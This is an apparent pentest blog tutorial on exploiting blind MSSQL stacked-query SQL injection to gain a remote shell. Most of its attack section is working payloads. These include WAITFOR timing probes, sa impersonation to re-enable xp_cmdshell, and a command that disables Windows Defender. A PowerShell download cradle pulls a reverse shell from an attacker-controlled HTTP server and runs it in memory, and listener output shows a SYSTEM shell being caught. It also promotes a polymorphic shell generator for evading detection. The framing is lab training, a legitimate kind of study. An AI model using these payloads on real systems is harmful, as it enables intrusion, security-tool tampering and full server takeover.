Blind but Not Stuck:
MSSQL Stacked Queries to Shell

MSSQL · xp_cmdshell · PowerShell Cradle

Most pentesters or OffSec students are familiarized with inbound SQLi. Those are the kind of injections that give the user some text back to the browser. They are easier to exploit and easier to identify. But a site may be still vulnerable to SQLi even if the app isn't giving you anything back. It may allow you to run stacked queries. And you can own an actual box if that's present. Keep reading and let me explain what that is, and how it can be abused.

Let's start by defining the term. A stacked query is just two or more SQL statements separated by a semicolon, both executed in the same call. For example, check the two queries below:

sql — basic stacked example
SELECT * FROM products WHERE id = 1; SELECT @@version;

For someone who does not know TSQL it may look like a single query. But the semicolon breaks it down into two.

Now, both run. The problem is the app usually only shows the result of the first one. So even if your second query does something useful, you won't see it in the response.

MSSQL supports this natively. MySQL and Oracle? They do not, at least not in most driver configurations. So when you're dealing with MSSQL, stacked queries are a real attack surface even when everything looks blind.

● enumeration tip
This highlights the importance of enumeration. Use nmap or Wappalyzer to identify the technology running behind a site. If it runs Windows, chances are MSSQL is also present.

I remember this being a huge debate back during my DBA days when I was still working for Hewlett Packard. My colleagues, Oracle DBAs, said stacked queries were bad and insecure. But at the same time, the implementation of some solutions was actually easier with TSQL because Microsoft MSSQL supports stacked queries and Linked Servers. Even today and as far as I know, this is not something Oracle does natively. To be honest, it is a curse and a blessing at the same time. And soon you will see why.

02 — technique comparison

UNION won't save you here

UNION SELECT

  • Column count must match exactly
  • Data types have to align
  • Requires output reflection in response
  • Blind = completely useless
  • You're guessing query structure

Stacked Queries

  • Column count is irrelevant
  • Data types are irrelevant
  • No output reflection needed
  • Works perfectly blind
  • New statement, clean slate

UNION is the most common way to extract data from a web app that is vulnerable to SQLi, but it has a hard requirement. The number of columns in your injected SELECT has to match the original query exactly. You also have to get the data types right. If you don't know the query structure you're injecting into, you're guessing. And even if you get it right, UNION only works when the response actually reflects column data back to you. So no output means UNION is useless.

But stacked queries don't care about any of that. You're not appending to the original SELECT. You're starting a new statement entirely. Column count is irrelevant. Data types are irrelevant. You're just telling the server to do something after it finishes the first query.

03 — confirmation

Confirming stacked queries

Now, before you throw any payloads and start testing for stacked queries, you want to confirm the injection point actually supports it. And the easiest way to do that on MSSQL is with WAITFOR DELAY.

The idea is simple. You inject a second statement that tells the server to sleep for a few seconds. If the response takes that long to come back, the server executed your query. Simple.

sql — basic time delay
'; WAITFOR DELAY '0:0:5'; --
sql — conditional true (delay fires)
'; IF (1=1) WAITFOR DELAY '0:0:5'; --
sql — conditional false (no delay)
'; IF (1=2) WAITFOR DELAY '0:0:5'; --

▶ response time delta — what you're looking for

normal request
~80ms
WAITFOR injected
~5000ms

If the response takes about five seconds longer than your baseline, you've got stacked queries. That's your confirmation.

● tip
Always establish a baseline response time before injecting. A slow app can mislead you. Hit the endpoint a few times clean, average the response, then inject and compare the delta.
04 — exploitation

Turning stacked queries into a hell [shell]

Now, once you've confirmed it works, the path to code execution on MSSQL is pretty straightforward. You need xp_cmdshell, and by default it's been disabled since SQL Server 2005. But disabled doesn't mean gone. You can turn it back on if you have the right privileges, and that's where EXECUTE AS LOGIN comes in. Oh yeah!

The idea is to impersonate the sa login for the duration of your injected statements. For this to work, the current login needs to have been explicitly granted IMPERSONATE on sa, or it already belongs to the sysadmin role, which gets that permission. Once you're running as sa, sp_configure is available and you can flip xp_cmdshell back on. Executing xp_cmdshell requires CONTROL SERVER permission, which sa has. That's the whole chain.

⚠ before you start
Start your listener first. The execution chain is sequential and the last payload fires your shell immediately. You want to be ready.

rlwrap nc -lvnp 443
1
impersonate sa — expose advanced options
'; EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; --
2
enable xp_cmdshell
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --

Now we are ready for the last two payloads that will, in this case, give us access to the underlying application or server:

3
kill defender
'; EXEC xp_cmdshell 'powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"'; --
⚠ this only works under two conditions
Set-MpPreference requires administrator privileges at the OS level. xp_cmdshell runs as the SQL Server service account, so this step only works if that service account is a local admin on the machine. Run whoami first to confirm. Also, if Tamper Protection is enabled, the command will appear to succeed but nothing actually changes. Defender stays on and gives you no error. In lab environments Tamper Protection is usually off. In hardened real-world targets it likely isn't.
4
deliver & execute payload via powershell cradle
'; EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://10.10.10.50/shell.txt'')"'; --

The last step is the one doing the heavy lifting here. Notice that instead of dropping a binary to disk and executing it, you're telling PowerShell to reach out to your HTTP server, pull shell.txt directly into memory, and execute it on the spot. Nothing written to disk. It is a classic in-memory execution technique and a better approach than dropping malicious files on disk to obtain a reverse shell. A file on disk will be flagged immediately by Defender.

● revshellgenerator
shell.txt was generated via RevShellGenerator. It's a polymorphic PowerShell reverse shell generator. Every run produces a functionally identical but structurally unique payload. Check my GitHub for more details.
session 1 — generate payload
└─$ RevShellGen --ip 10.10.10.50 --port 443 --out shell.txt
session 2 — http server
└─$ sudo python3 -m http.server 80 [sudo] password for kali: Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.100 - - [05/Jun/2026 13:14:10] "GET /shell.txt HTTP/1.1" 200 -
session 3 — listener
└─$ rlwrap nc -lvnp 443 listening on [any] 443 ... connect to [10.10.10.50] from (UNKNOWN) [10.10.10.100] 49923 PS C:\Windows\system32> whoami nt authority\system
05 — notes

Few things to keep in mind

xp_cmdshell runs as the SQL Server service account at the Windows level, not as sa. sa is a SQL login, not a Windows account. So even after impersonating sa inside SQL Server, the OS commands that xp_cmdshell spawns run under whatever Windows identity the SQL Server service is using. In a lot of lab environments that's a local admin or NT SERVICE\MSSQLSERVER. In others it's more restricted. whoami command will help you here.

Stacked queries are one of those SQLi techniques that don't get enough attention. Most people see a blind injection and move on. Don't. Test the WAITFOR, measure the delta, and if the server sleeps, you're already halfway to a shell. The rest is just chaining the right payloads in the right order.
